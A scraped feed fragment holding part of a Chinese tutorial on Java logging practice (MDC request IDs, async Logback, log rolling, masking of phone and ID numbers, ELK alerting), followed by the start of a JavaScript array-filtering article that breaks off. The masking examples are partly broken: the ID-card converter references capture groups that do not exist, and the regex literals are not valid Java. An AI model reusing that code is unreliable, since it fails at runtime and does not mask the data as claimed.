  <span class="hljs-attr">"timestamp"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"2024-05-20T10:30:00.123+08:00"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"level"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"INFO"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"message"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"订单创建成功，orderNo=ORDER20240520001"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"logger"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"com.demo.controller.OrderController"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"thread"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"http-nio-8080-exec-2"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>优势：可通过Kibana快速检索“requestId=req-20240520103000123”的所有日志，还原完整请求链路；也可按“userId”“orderNo”等字段过滤，定位特定用户的操作日志。</p>
<h4 data-id="heading-8">3. 日志内容要素：让每一条日志都“有价值”</h4>
<p>一条有价值的日志，必须包含“谁（用户/请求）在什么时候做了什么，结果如何，关键参数是什么”。核心要素应包括：</p>
<ul>
<li><strong>链路标识</strong>：requestId（请求ID），用于串联一次请求的全链路日志（分布式系统必备）；</li>
<li><strong>主体标识</strong>：userId（用户ID）、tenantId（租户ID），用于定位特定用户/租户的操作；</li>
<li><strong>业务参数</strong>：核心业务ID（如orderNo、productId），便于定位具体业务场景；</li>
<li><strong>操作描述</strong>：清晰说明当前操作（如“订单创建”“支付回调处理”）；</li>
<li><strong>结果状态</strong>：成功/失败，失败时需包含异常信息（堆栈或错误码）。</li>
</ul>
<p>实战技巧：使用MDC（Mapped Diagnostic Context）传递链路/主体标识，避免在每个日志语句中重复拼接参数。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.slf4j.MDC;
<span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;
<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;
<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;
<span class="hljs-keyword">import</span> java.util.UUID;

<span class="hljs-comment">// 自定义拦截器：生成requestId并放入MDC</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LogInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerInterceptor</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">preHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 生成唯一requestId</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">requestId</span> <span class="hljs-operator">=</span> UUID.randomUUID().toString().replace(<span class="hljs-string">"-"</span>, <span class="hljs-string">""</span>);
        MDC.put(<span class="hljs-string">"requestId"</span>, requestId);
        <span class="hljs-comment">// 从请求头获取userId（如登录后放入）</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">userId</span> <span class="hljs-operator">=</span> request.getHeader(<span class="hljs-string">"userId"</span>);
        <span class="hljs-keyword">if</span> (userId != <span class="hljs-literal">null</span>) {
            MDC.put(<span class="hljs-string">"userId"</span>, userId);
        }
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterCompletion</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 清除MDC，避免线程复用导致的参数污染</span>
        MDC.clear();
    }
}

<span class="hljs-comment">// 配置拦截器</span>
<span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebConfig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">WebMvcConfigurer</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addInterceptors</span><span class="hljs-params">(InterceptorRegistry registry)</span> {
        registry.addInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LogInterceptor</span>()).addPathPatterns(<span class="hljs-string">"/**"</span>);
    }
}

<span class="hljs-comment">// 业务代码中使用（无需拼接requestId和userId）</span>
<span class="hljs-meta">@RestController</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderController</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">log</span> <span class="hljs-operator">=</span> LoggerFactory.getLogger(OrderController.class);

    <span class="hljs-meta">@PostMapping("/order/create")</span>
    <span class="hljs-keyword">public</span> Result <span class="hljs-title function_">createOrder</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> OrderCreateDTO dto)</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">String</span> <span class="hljs-variable">orderNo</span> <span class="hljs-operator">=</span> orderService.create(dto);
            <span class="hljs-comment">// 日志自动包含MDC中的requestId和userId</span>
            log.info(<span class="hljs-string">"订单创建成功，orderNo={}, 商品ID列表={}"</span>, orderNo, dto.getProductIds());
            <span class="hljs-keyword">return</span> Result.success(orderNo);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            log.error(<span class="hljs-string">"订单创建失败，请求参数={}"</span>, dto, e);
            <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-string">"创建失败"</span>);
        }
    }
}
</code></pre>
<h4 data-id="heading-9">4. 性能优化：减少日志对系统的损耗</h4>
<p>日志输出本质是IO操作，高并发场景下，不恰当的日志输出会严重影响系统性能。核心优化手段包括：</p>
<h5 data-id="heading-10">（1）避免无效日志拼接</h5>
<p>使用SLF4J的占位符 <code>{} </code>而非字符串拼接（<code>+</code>），避免在日志级别不满足时产生无效的字符串拼接开销。</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// 反例：即使日志级别是WARN，也会执行字符串拼接，产生性能损耗</span>
<span class="hljs-built_in">log</span>.debug(<span class="hljs-string">"订单查询，orderNo="</span> + orderNo + <span class="hljs-string">", userId="</span> + userId);

<span class="hljs-comment">// 正例：使用占位符，日志级别不满足时不会执行参数拼接</span>
<span class="hljs-built_in">log</span>.debug(<span class="hljs-string">"订单查询，orderNo={}, userId={}"</span>, orderNo, userId);
</code></pre>
<h5 data-id="heading-11">（2）高并发场景使用异步日志</h5>
<p>同步日志会阻塞业务线程，直到日志写入完成；异步日志则通过独立线程写入日志，不阻塞业务线程，适合高并发场景。Logback配置异步日志示例：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- 异步日志配置 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">appender</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"ASYNC_FILE"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"ch.qos.logback.classic.AsyncAppender"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">discardingThreshold</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">discardingThreshold</span>&gt;</span> <span class="hljs-comment">&lt;!-- 不丢弃日志（关键业务建议） --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">queueSize</span>&gt;</span>1024<span class="hljs-tag">&lt;/<span class="hljs-name">queueSize</span>&gt;</span> <span class="hljs-comment">&lt;!-- 队列大小：根据并发量调整 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">appender-ref</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">"FILE"</span> /&gt;</span> <span class="hljs-comment">&lt;!-- 关联文件输出appender --&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">appender</span>&gt;</span>
</code></pre>
<h5 data-id="heading-12">（3）控制日志输出量</h5>
<ul>
<li>生产环境关闭DEBUG/TRACE级别日志；</li>
<li>避免在循环内输出日志（如遍历1000条数据时，每条都打日志）；</li>
<li>对高频接口的日志进行抽样输出（如每100次请求输出1次日志）。</li>
</ul>
<h5 data-id="heading-13">（4）合理设置日志滚动策略</h5>
<p>避免单个日志文件过大，导致检索缓慢。通过日志滚动策略按时间/大小分割日志，例如：按天滚动，每天一个日志文件；单个文件超过100MB时强制滚动。Logback配置示例：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">appender</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"FILE"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"ch.qos.logback.core.rolling.RollingFileAppender"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">file</span>&gt;</span>logs/order-service.log<span class="hljs-tag">&lt;/<span class="hljs-name">file</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">rollingPolicy</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"ch.qos.logback.core.rolling.TimeBasedRollingPolicy"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">fileNamePattern</span>&gt;</span>logs/order-service.%d{yyyy-MM-dd}.log<span class="hljs-tag">&lt;/<span class="hljs-name">fileNamePattern</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">maxHistory</span>&gt;</span>30<span class="hljs-tag">&lt;/<span class="hljs-name">maxHistory</span>&gt;</span> <span class="hljs-comment">&lt;!-- 保留30天日志 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">totalSizeCap</span>&gt;</span>10GB<span class="hljs-tag">&lt;/<span class="hljs-name">totalSizeCap</span>&gt;</span> <span class="hljs-comment">&lt;!-- 日志总大小限制 --&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">rollingPolicy</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">triggeringPolicy</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"ch.qos.logback.core.rolling.SizeBasedTriggeringPolicy"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">maxFileSize</span>&gt;</span>100MB<span class="hljs-tag">&lt;/<span class="hljs-name">maxFileSize</span>&gt;</span> <span class="hljs-comment">&lt;!-- 单个文件最大100MB --&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">triggeringPolicy</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">encoder</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">pattern</span>&gt;</span>%d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] %-5level %logger{50} - %msg%n<span class="hljs-symbol">&amp;lt;</span>/pattern<span class="hljs-symbol">&amp;gt;</span>
    <span class="hljs-symbol">&amp;lt;</span>/encoder<span class="hljs-symbol">&amp;gt;</span>
<span class="hljs-symbol">&amp;lt;</span>/appender<span class="hljs-symbol">&amp;gt;</span>
</code></pre>
<h4 data-id="heading-14">5. 安全脱敏：保护敏感信息不泄露</h4>
<p>日志中若包含用户密码、手机号、身份证号、银行卡号等敏感信息，会违反《个人信息保护法》等合规要求。核心脱敏策略：“能不输出就不输出，必须输出则脱敏”。</p>
<h5 data-id="heading-15">（1）常见脱敏场景与方法</h5>
<ul>
<li><strong>接口入参/出参脱敏</strong>：对包含敏感信息的DTO字段进行脱敏，可通过自定义JSON序列化器实现；</li>
<li><strong>日志语句脱敏</strong>：对关键敏感参数手动脱敏（如手机号保留前3后4位）；</li>
<li><strong>全局拦截脱敏</strong>：通过Logback的自定义转换器，对日志中的敏感信息自动拦截脱敏。</li>
</ul>
<h5 data-id="heading-16">（2）实战：自定义JSON序列化器脱敏</h5>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-keyword">import</span> com.fasterxml.jackson.core.<span class="hljs-type">JsonGenerator</span>;
<span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.<span class="hljs-type">JsonSerializer</span>;
<span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.<span class="hljs-type">SerializerProvider</span>;
<span class="hljs-keyword">import</span> java.io.<span class="hljs-type">IOException</span>;

<span class="hljs-comment">// 手机号脱敏序列化器</span>
public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MobileDesensitizer</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">JsonSerializer&lt;String&gt;</span> </span>{
    <span class="hljs-meta">@Override</span>
    public void serialize(<span class="hljs-type">String</span> mobile, <span class="hljs-type">JsonGenerator</span> gen, <span class="hljs-type">SerializerProvider</span> serializers) <span class="hljs-keyword">throws</span> <span class="hljs-type">IOException</span> {
        <span class="hljs-keyword">if</span> (mobile != <span class="hljs-literal">null</span> &amp;&amp; mobile.length() == <span class="hljs-number">11</span>) {
            gen.writeString(mobile.replaceAll(<span class="hljs-string">"(\d{3})\d{4}(\d{4})"</span>, <span class="hljs-string">"$1****$2"</span>));
        } <span class="hljs-keyword">else</span> {
            gen.writeString(mobile);
        }
    }
}

<span class="hljs-comment">// 在DTO中使用</span>
public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserDTO</span> </span>{
    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> userId;
    
    <span class="hljs-meta">@JsonSerialize</span>(<span class="hljs-keyword">using</span> = <span class="hljs-type">MobileDesensitizer</span>.<span class="hljs-keyword">class</span>)
    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> mobile; <span class="hljs-comment">// 序列化时自动脱敏</span>
    
    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> username;
    <span class="hljs-comment">// 省略getter/setter</span>
}

<span class="hljs-comment">// 日志输出效果：mobile=138****1234</span>
log.info(<span class="hljs-string">"用户登录成功，用户信息={}"</span>, userDTO);
</code></pre>
<h5 data-id="heading-17">（3）实战：Logback全局脱敏转换器</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> ch.qos.logback.classic.pattern.ClassicConverter;
<span class="hljs-keyword">import</span> ch.qos.logback.classic.spi.ILoggingEvent;
<span class="hljs-keyword">import</span> java.util.regex.Pattern;

<span class="hljs-comment">// 日志全局脱敏转换器：匹配手机号、身份证号</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LogDesensitizerConverter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ClassicConverter</span> {
    <span class="hljs-comment">// 手机号正则：11位数字</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Pattern</span> <span class="hljs-variable">MOBILE_PATTERN</span> <span class="hljs-operator">=</span> Pattern.compile(<span class="hljs-string">"1[3-9]\d{9}"</span>);
    <span class="hljs-comment">// 身份证号正则：18位（含X）</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Pattern</span> <span class="hljs-variable">ID_CARD_PATTERN</span> <span class="hljs-operator">=</span> Pattern.compile(<span class="hljs-string">"\d{17}[0-9Xx]"</span>);

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">convert</span><span class="hljs-params">(ILoggingEvent event)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> event.getMessage();
        <span class="hljs-keyword">if</span> (message == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-string">""</span>;
        }
        <span class="hljs-comment">// 手机号脱敏</span>
        message = MOBILE_PATTERN.matcher(message).replaceAll(<span class="hljs-string">"****"</span>);
        <span class="hljs-comment">// 身份证号脱敏（保留前6后4）</span>
        message = ID_CARD_PATTERN.matcher(message).replaceAll(<span class="hljs-string">"$1****$2"</span>);
        <span class="hljs-keyword">return</span> message;
    }
}

<span class="hljs-comment">// 在logback-spring.xml中配置</span>
&lt;conversionRule conversionWord=<span class="hljs-string">"msg"</span> converterClass=<span class="hljs-string">"com.demo.log.LogDesensitizerConverter"</span> /&gt;
</code></pre>
<h4 data-id="heading-18">6. 日志监控告警：让日志“主动说话”</h4>
<p>优化后的日志不仅要“可检索”，还要能“主动告警”——当系统出现异常时，通过日志监控工具及时触发告警，避免故障扩大。核心实现方案：ELK栈 + 告警插件（如Elastic Alert）。</p>
<h5 data-id="heading-19">（1）ELK栈日志流转流程</h5>
<ol>
<li>Logback将结构化日志输出到文件；</li>
<li>Logstash读取日志文件，过滤、解析日志（如提取字段）；</li>
<li>Logstash将处理后的日志写入Elasticsearch；</li>
<li>Kibana对接Elasticsearch，实现日志检索、可视化；</li>
<li>配置告警规则（如ERROR日志5分钟内超过10条、出现“数据库连接失败”日志），触发钉钉/短信/邮件告警。</li>
</ol>
<h5 data-id="heading-20">（2）关键告警规则建议</h5>
<ul>
<li>ERROR级别日志数量突增（如5分钟内超过阈值）；</li>
<li>出现特定错误日志（如“数据库连接超时”“NPE”“服务熔断”）；</li>
<li>核心业务日志缺失（如10分钟内无“订单支付成功”日志，可能支付服务异常）；</li>
<li>接口响应时间异常（通过日志中的耗时字段监控，如耗时超过5秒）。</li>
</ul>
<h3 data-id="heading-21">三、日志输出优化的“避坑指南”</h3>
<p>在日志优化过程中，容易陷入一些误区，以下是常见坑点及规避方法：</p>
<ul>
<li><strong>坑点1：日志级别“一刀切”</strong> ：所有包都使用相同的日志级别（如根日志设为DEBUG），导致生产环境日志爆炸。 规避：根日志设为INFO，对特定包（如mapper、第三方框架）单独设为WARN；</li>
<li><strong>坑点2：日志内容“越详细越好”</strong> ：输出完整的请求体、响应体，包含大量冗余信息。 规避：只输出核心业务参数，敏感信息脱敏，避免输出大文本（如JSON数组、文件内容）；</li>
<li><strong>坑点3：异步日志“滥用”</strong> ：所有日志都用异步输出，导致日志丢失（队列满时可能丢弃日志）。 规避：关键业务日志（如支付、订单）使用同步日志或配置不丢弃的异步日志；非关键日志可使用异步；</li>
<li><strong>坑点4：忽略日志清理</strong>：日志无保留期限，导致磁盘空间被占满。 规避：配置日志保留期限（如30天）和总大小限制，定期清理过期日志；</li>
<li><strong>坑点5：MDC未清理</strong>：线程池复用导致MDC中的参数污染（如前一个请求的requestId被后续请求复用）。 规避：在请求结束后（拦截器afterCompletion）清除MDC；线程池使用时，手动传递MDC参数。</li>
</ul>
<h3 data-id="heading-22">四、总结：日志优化的核心原则</h3>
<p>日志输出优化的核心不是“追求复杂的配置”，而是围绕“<strong>规范、实用、安全、高效</strong>”四个关键词：</p>
<ul>
<li>规范：按场景使用日志级别，统一日志格式；</li>
<li>实用：日志内容包含关键要素，能快速定位问题；</li>
<li>安全：敏感信息脱敏，符合合规要求；</li>
<li>高效：减少日志对系统性能的损耗，实现自动化监控告警。</li>
</ul>
<p>其实日志优化没有“银弹”，需要结合业务场景不断调整。建议从“规范日志级别”“添加链路标识”“结构化输出”这三个基础点入手，逐步落地性能优化和安全脱敏，让日志真正成为系统稳定性的“守护者”。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JavaScript 数组中删除偶数下标值的多种方法]]></title>    <link>https://juejin.cn/post/7591806035758645290</link>    <guid>https://juejin.cn/post/7591806035758645290</guid>    <pubDate>2026-01-06T07:18:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591806035758645290" data-draft-id="7592088192506757174" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JavaScript 数组中删除偶数下标值的多种方法"/> <meta itemprop="keywords" content="前端,JavaScript,Vue.js"/> <meta itemprop="datePublished" content="2026-01-06T07:18:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="持续前行"/> <meta itemprop="url" content="https://juejin.cn/user/2946346892397181"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JavaScript 数组中删除偶数下标值的多种方法
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2946346892397181/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    持续前行
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T07:18:36.000Z" title="Tue Jan 06 2026 07:18:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><ol>
<li><strong>使用 filter 方法（推荐）</strong></li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 方法1: 使用filter保留奇数下标元素</span>
<span class="hljs-keyword">const</span> arr = [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>];

<span class="hljs-comment">// 删除偶数下标（0, 2, 4, 6, 8...），保留奇数下标</span>
<span class="hljs-keyword">const</span> result1 = arr.<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">_, index</span>) =&gt;</span> index % <span class="hljs-number">2</span> !== <span class="hljs-number">0</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result1); <span class="hljs-comment">// [1, 3, 5, 7, 9]</span>

<span class="hljs-comment">// 或删除奇数下标，保留偶数下标</span>
<span class="hljs-keyword">const</span> result2 = arr.<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">_, index</span>) =&gt;</span> index % <span class="hljs-number">2</span> === <span class="hljs-number">0</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result2); <span class="hljs-comment">// [0, 2, 4, 6, 8]</span>
</code></pre>
<h2 data-id="heading-0">2. <strong>使用 for 循环（原地修改）</strong></h2>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// 方法2: 从后向前遍历，原地删除</span>
function <span class="hljs-built_in">removeEvenIndexes</span>(arr) {
  <span class="hljs-comment">// 从后向前遍历，避免索引错乱</span>
  for (let i = arr.length - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--) {
    if (i % <span class="hljs-number">2</span> === <span class="hljs-number">0</span>) {  <span class="hljs-comment">// 删除偶数下标</span>
      arr<span class="hljs-selector-class">.splice</span>(i, <span class="hljs-number">1</span>);
    }
  }
  return arr;
}

const arr = <span class="hljs-selector-attr">[0, 1, 2, 3, 4, 5, 6, 7, 8, 9]</span>;
console<span class="hljs-selector-class">.log</span>(removeEvenIndexes(arr)); <span class="hljs-comment">// [1, 3, 5, 7, 9]</span>
console<span class="hljs-selector-class">.log</span>(arr); <span class="hljs-comment">// 原数组也被修改</span>
</code></pre>
<ol start="3">
<li><strong>使用 reduce 方法</strong></li>
</ol>
<pre><code class="hljs language-ini" lang="ini">// 方法3: 使用reduce
const <span class="hljs-attr">arr</span> = [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>]<span class="hljs-comment">;</span>

const <span class="hljs-attr">result</span> = arr.reduce((acc, cur, index) =&gt; {
  if (index % 2 !== 0) {  // 只保留奇数下标
    acc.push(cur)<span class="hljs-comment">;</span>
  }
  return acc<span class="hljs-comment">;</span>
}, <span class="hljs-section">[]</span>)<span class="hljs-comment">;</span>

console.log(result)<span class="hljs-comment">; // [1, 3, 5, 7, 9]</span>

</code></pre>
<ol start="4">
